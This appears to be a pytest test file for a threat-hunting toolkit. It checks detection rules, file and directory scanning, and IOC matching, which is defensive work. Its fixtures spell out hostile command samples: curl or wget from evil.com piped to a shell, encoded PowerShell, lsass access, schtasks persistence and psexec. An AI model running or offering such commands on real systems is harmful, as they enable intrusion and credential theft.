"""Tests for project_99 core — Threat Hunting Toolkit."""

from __future__ import annotations

from pathlib import Path

from project_99.core import (
    BUILTIN_RULES,
    IOC,
    HuntMatch,
    HuntRule,
    hunt_directory,
    hunt_file,
    hunt_iocs_in_text,
    load_ioc_file,
    load_rules_from_dict,
)


def _rule_by_id(rule_id: str) -> HuntRule:
    for r in BUILTIN_RULES:
        if r.rule_id == rule_id:
            return r
    raise KeyError(rule_id)


# ── HuntRule matching ─────────────────────────────────────────────────────────

class TestHuntRuleMatches:
    def test_hunt001_powershell_encoded(self) -> None:
        rule = _rule_by_id("HUNT-001")
        line = "powershell.exe -EncodedCommand SGVsbG8gV29ybGQhISEhISEhISEhISEhISEhISEhISEhISE="
        assert rule.matches_line(line) is True

    def test_hunt001_no_match(self) -> None:
        rule = _rule_by_id("HUNT-001")
        assert rule.matches_line("powershell.exe -Command Get-Process") is False

    def test_hunt002_curl_pipe_bash(self) -> None:
        rule = _rule_by_id("HUNT-002")
        assert rule.matches_line("curl http://evil.com/payload | bash") is True

    def test_hunt002_wget_pipe_sh(self) -> None:
        rule = _rule_by_id("HUNT-002")
        assert rule.matches_line("wget -qO- http://example.com | sh") is True

    def test_hunt003_lsass(self) -> None:
        rule = _rule_by_id("HUNT-003")
        assert rule.matches_line("OpenProcess(lsass.exe, 0x1F0FFF)") is True

    def test_hunt004_schtasks(self) -> None:
        rule = _rule_by_id("HUNT-004")
        assert rule.matches_line("schtasks /create /tn malware /tr cmd.exe") is True

    def test_hunt005_psexec(self) -> None:
        rule = _rule_by_id("HUNT-005")
        assert rule.matches_line("psexec \\\\10.0.0.1 cmd.exe") is True

    def test_hunt007_dns_tunnel(self) -> None:
        rule = _rule_by_id("HUNT-007")
        assert rule.matches_line("aHR0cHM6Ly9leGFtcGxlLmNvbQ.tunneldomain.com DNS query") is True

    def test_hunt009_tor_port(self) -> None:
        rule = _rule_by_id("HUNT-009")
        assert rule.matches_line("connection to 127.0.0.1:9050 established") is True

    def test_hunt010_aws_upload(self) -> None:
        rule = _rule_by_id("HUNT-010")
        assert rule.matches_line("PUT /backup.tar.gz s3.amazonaws.com") is True

    def test_clean_line_no_match(self) -> None:
        for rule in BUILTIN_RULES:
            assert rule.matches_line("2024-01-01 INFO User login successful") is False


class TestHuntRuleCondition:
    def test_any_condition_one_match_sufficient(self) -> None:
        rule = HuntRule(
            rule_id="T001", name="test", description="", severity="HIGH",
            mitre_technique="T1059", patterns=["patternA", "patternB"], condition="any",
            field_patterns={},
        )
        assert rule.matches_line("contains patternA here") is True

    def test_all_condition_requires_all(self) -> None:
        rule = HuntRule(
            rule_id="T002", name="test", description="", severity="HIGH",
            mitre_technique="T1059", patterns=["patternA", "patternB"], condition="all",
            field_patterns={},
        )
        assert rule.matches_line("contains patternA but not the other") is False
        assert rule.matches_line("contains patternA and patternB both") is True


# ── load_rules_from_dict ──────────────────────────────────────────────────────

class TestLoadRules:
    def test_loads_rules(self) -> None:
        data = {
            "rules": [
                {"rule_id": "R001", "name": "test", "severity": "HIGH",
                 "mitre_technique": "T1059", "patterns": ["evil"]}
            ]
        }
        rules = load_rules_from_dict(data)
        assert len(rules) == 1
        assert rules[0].rule_id == "R001"

    def test_empty_rules(self) -> None:
        assert load_rules_from_dict({}) == []


# ── hunt_file ─────────────────────────────────────────────────────────────────

class TestHuntFile:
    def test_detects_match(self, tmp_path: Path) -> None:
        f = tmp_path / "auth.log"
        f.write_text("2024-01-01 INFO curl http://evil.com | bash\n")
        matches = hunt_file(f)
        assert any(m.rule_id == "HUNT-002" for m in matches)

    def test_clean_file_no_matches(self, tmp_path: Path) -> None:
        f = tmp_path / "app.log"
        f.write_text("2024-01-01 INFO normal log entry\n")
        matches = hunt_file(f)
        assert matches == []

    def test_skips_binary_extension(self, tmp_path: Path) -> None:
        f = tmp_path / "data.pyc"
        f.write_bytes(b"lsass.exe")
        assert hunt_file(f) == []

    def test_match_has_correct_line_number(self, tmp_path: Path) -> None:
        f = tmp_path / "cmd.log"
        f.write_text("clean line\ncurl http://bad.com | bash\nanother line\n")
        matches = hunt_file(f)
        hunt002 = [m for m in matches if m.rule_id == "HUNT-002"]
        assert hunt002[0].line_number == 2

    def test_custom_rules(self, tmp_path: Path) -> None:
        f = tmp_path / "test.log"
        f.write_text("CUSTOM_EVIL_PATTERN detected\n")
        rule = HuntRule(rule_id="C001", name="custom", description="", severity="HIGH",
                        mitre_technique="T1059", patterns=["CUSTOM_EVIL_PATTERN"],
                        field_patterns={})
        matches = hunt_file(f, rules=[rule])
        assert any(m.rule_id == "C001" for m in matches)


# ── hunt_directory ────────────────────────────────────────────────────────────

class TestHuntDirectory:
    def test_hunts_multiple_files(self, tmp_path: Path) -> None:
        (tmp_path / "a.log").write_text("schtasks /create /tn evil\n")
        (tmp_path / "b.log").write_text("normal\n")
        report = hunt_directory(tmp_path)
        assert report.files_scanned == 2
        assert any(m.rule_id == "HUNT-004" for m in report.matches)

    def test_to_dict_structure(self, tmp_path: Path) -> None:
        (tmp_path / "log.txt").write_text("lsass.exe dump\n")
        report = hunt_directory(tmp_path)
        d = report.to_dict()
        assert "matches" in d
        assert "total_matches" in d
        assert "by_rule" in d


# ── IOC scanning ──────────────────────────────────────────────────────────────

class TestIOCScanning:
    def test_ioc_match_found(self) -> None:
        iocs = [IOC("ip", "10.99.0.1"), IOC("domain", "evil.com")]
        text = "Connection from 10.99.0.1 to port 443"
        hits = hunt_iocs_in_text(text, iocs)
        assert any(ioc.value == "10.99.0.1" for ioc, _, _ in hits)

    def test_no_ioc_match(self) -> None:
        iocs = [IOC("ip", "10.99.0.1")]
        text = "clean log line with no IOC"
        assert hunt_iocs_in_text(text, iocs) == []

    def test_load_ioc_file(self, tmp_path: Path) -> None:
        f = tmp_path / "iocs.jsonl"
        f.write_text('{"type": "ip", "value": "10.99.0.1"}\n{"type": "domain", "value": "evil.com"}\n')
        iocs = load_ioc_file(f)
        assert len(iocs) == 2
        assert iocs[0].ioc_type == "ip"

    def test_load_ioc_skips_invalid(self, tmp_path: Path) -> None:
        f = tmp_path / "iocs.jsonl"
        f.write_text('not-json\n{"type": "ip", "value": "1.2.3.4"}\n')
        iocs = load_ioc_file(f)
        assert len(iocs) == 1


# ── HuntMatch serialization ───────────────────────────────────────────────────

class TestHuntMatchToDict:
    def test_to_dict_keys(self) -> None:
        m = HuntMatch(rule_id="HUNT-001", rule_name="test", severity="HIGH",
                      mitre_technique="T1059", file_path="/tmp/test.log",
                      line_number=42, line_content="evil stuff")
        d = m.to_dict()
        assert set(d.keys()) >= {"rule_id", "rule_name", "severity", "file_path", "line_number"}
